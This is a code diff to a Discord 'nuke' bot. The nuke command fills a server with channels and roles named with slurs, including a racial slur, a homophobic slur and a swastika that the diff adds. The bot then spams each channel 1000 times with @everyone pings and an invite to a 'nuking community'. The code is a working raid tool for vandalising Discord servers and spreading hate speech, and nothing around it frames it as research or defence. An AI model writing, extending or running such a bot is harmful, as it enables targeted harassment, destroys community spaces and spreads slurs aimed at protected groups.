@@ -260,7 +260,7 @@ async def renameChannel(ctx, *, new_name):
 @bot.command()
 async def nuke(ctx):
     guild = bot.get_guild(server_id)
-    channel_names = ['[҉😂]҉ 𝔽𝕦𝕔𝕜𝕖𝕕 𝕓𝕪 𝕆𝕗𝕗𝕝𝕚𝕟𝕖𝕋𝕙𝕖𝕞𝕖𝕟𝕒𝕔𝕖', '【🤡】 𝐂𝐫𝐲 𝐧𝐢𝐠𝐠𝐚', '[🏳️‍🌈🚫] 🆄🆁 🅰 🅵🅰🅶🅶🅾🆃', '「🕴️」b͓̽i͓̽t͓̽c͓̽h͓̽']
+    channel_names = ['[҉😂]҉ 𝔽𝕦𝕔𝕜𝕖𝕕 𝕓𝕪 𝕆𝕗𝕗𝕝𝕚𝕟𝕖𝕋𝕙𝕖𝕞𝕖𝕟𝕒𝕔𝕖', '【🤡】 𝐂𝐫𝐲 𝐧𝐢𝐠𝐠𝐚', '[🏳️‍🌈🚫] 🆄🆁 🅰 🅵🅰🅶🅶🅾🆃', '「🕴️」b͓̽i͓̽t͓̽c͓̽h͓̽', '卐']
     role_names = channel_names
 
     # Shuffle the channel names to create channels in a random order
@@ -309,7 +309,7 @@ async def nuke(ctx):
     async def spam_channel(channel):
         try:
             for _ in range(1000):
-                await channel.send('@everyone https://discord.gg/rsZcW4QmJD')
+                await channel.send('@everyone https://discord.gg/b5gXmJUUeu JOIN THE BEST NUKING COMMUNITY!!! OfflineBot On Top')
         except Exception as e:
             print(colored(f'『+』Error spamming channel: {e}', 'red'))
 
